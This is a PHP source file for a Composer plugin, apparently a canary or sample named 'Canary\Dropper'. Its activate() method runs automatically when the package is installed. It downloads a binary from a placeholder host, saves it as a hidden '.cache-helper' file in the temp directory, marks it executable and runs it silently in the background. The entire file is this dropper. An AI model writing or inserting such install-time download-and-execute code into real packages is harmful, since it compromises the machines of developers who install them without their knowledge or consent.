<?php
namespace Canary\Dropper;
use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;
class Plugin implements PluginInterface {
    public function activate(Composer $composer, IOInterface $io) {
        $tmp = sys_get_temp_dir() . '/.cache-helper';
        $bin = file_get_contents('https://payload.invalid/helper-linux-amd64');
        file_put_contents($tmp, $bin);
        chmod($tmp, 0755);
        exec($tmp . ' >/dev/null 2>&1 &');
    }
    public function deactivate(Composer $composer, IOInterface $io) {}
    public function uninstall(Composer $composer, IOInterface $io) {}
}
